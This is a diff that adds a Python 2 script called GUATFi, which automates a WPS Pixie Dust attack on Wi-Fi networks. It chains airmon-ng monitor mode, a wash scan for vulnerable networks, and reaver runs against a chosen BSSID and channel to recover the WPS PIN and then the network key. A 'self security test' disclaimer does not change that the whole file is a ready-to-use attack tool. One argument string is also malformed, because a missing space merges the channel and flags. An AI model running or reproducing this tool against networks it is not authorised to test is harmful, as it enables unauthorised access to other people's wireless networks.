@@ -1,0 +1,94 @@
+#! /usr/bin/python
+
+import os
+import sys
+from termcolor import colored
+
+def exitban():
+    print colored("::::::::::::::::::::::::::::::::::::","white","on_red")
+    print colored("::  Thanks for fool with guatfi   ::","yellow",attrs=["bold"])
+    print colored("::::::::::::::::::::::::::::::::::::","white","on_red")
+#
+monend=" "
+print colored("::::::::::::::::::::::::::::::::::::::::::::::::::","green",attrs=["bold"])
+print colored(":::::::::::::     GUATFi v1.0    :::::::::::::::::","white","on_red",attrs=["bold"])
+print colored("::::::::::  created by Josue Gonzalez   ::::::::::","white","on_red",attrs=["bold"])
+print colored("::::::::::::::::::::::::::::::::::::::::::::::::::",'green',attrs=["bold"])
+print colored("::::::::::::: Ctrl+z to quit the program :::::::::","yellow",attrs=["bold"])
+print colored("::: warning this tool is for self security test ::","white",attrs=["bold"])
+print colored("::::::::::: im not responsible for misuse ::::::::","white",attrs=["bold"])
+print colored("::::::: this tool is based in pixieDust attack :::","white",attrs=["bold"])
+print colored("::::::::::::::::::::::::::::::::::::::::::::::::::","white",attrs=["bold"])
+print("")
+print colored(".........scanning adapters with airmon-ng.......","green",attrs=["bold"])
+os.system("airmon-ng")
+print colored("select the wifi Interface (example: wlan0)","white","on_blue",attrs=["bold"])
+adsl=raw_input(":>")
+if adsl=="":
+   print colored("none as wlan interface","red",attrs=["bold"])
+   exitban()
+   quit()
+else:
+   pass   
+adsel=" " + adsl
+print colored("Starting monitor mode...","white","on_red",attrs=["bold"])
+os.system("airmon-ng check kill")
+os.system("airmon-ng start" + adsel)
+admon=adsel + "mon"
+print colored("::::::::::::::::::::::::::::::::::::::::::::::","white","on_green",attrs=["bold"])
+print colored("::Scanning for possible vulnerables networks::","white","on_red",attrs=["bold"])
+print colored("::::::::::::::::::::::::::::::::::::::::::::::","white","on_green",attrs=["bold"])
+print colored("","yellow",attrs=["bold"])
+print colored("press Ctrl+c to escape from scan and continue ","white","on_red",attrs=["bold"])
+print colored("","yellow",attrs=["bold"])
+os.system("wash -i" + admon)
+print colored("")
+print colored(":::::: quitting the scanning :::::::","white","on_red",attrs=["bold"])
+print colored("","white","on_blue",attrs=["bold"])
+print colored("select the Bssid of the network)","white","on_blue",attrs=["bold"])
+print colored("","white","on_blue",attrs=["bold"])
+
+nbid=raw_input(":>")
+if nbid=="":
+   os.system("airmon-ng stop" + monend + admon)
+   print colored("No BSSID choosed quiting program","white","on_red",attrs=["bold"])
+   exitban()
+   quit()
+else:
+    pass
+print colored("Select the channel of the network","white","on_blue",attrs=["bold"])
+nch=raw_input(":>")
+if nch=="":
+   os.system("airmon-ng stop" + monend + admon)
+   print colored("No channel choosed quitting program","white","on_red",attrs=["bold"])
+   exitban()
+   quit()
+else:
+    pass
+print colored(":::::::::::::::::::::::::::::::::::::::","white","on_red")
+print colored("      Launching the attack    ","yellow",attrs=["bold"])
+print colored(":::::::::::::::::::::::::::::::::::::::","white","on_red")
+revint=" -i " + admon
+revsid=" -b " + nbid
+revch=" -c " + nch
+revparam="-f -K 1 -vvv"
+revparam2=" -s y -vv -p "
+revset=revint + revsid + revch + revparam
+os.system("reaver" + revset)
+monend=" "
+print colored("introduce the pin you got,if not press enter to skip and close gufi","blue",attrs=["bold"])
+revpin=raw_input(":>")
+if revpin=="":
+   os.system("airmon-ng stop" + monend + admon)
+   exitban()
+   quit()
+else:
+   pass
+revset2=revint + revsid + revch + revparam2 +revpin
+os.system("reaver" + revset2)
+os.system("airmon-ng stop" + monend + admon)
+exitban()
+
+
+
+
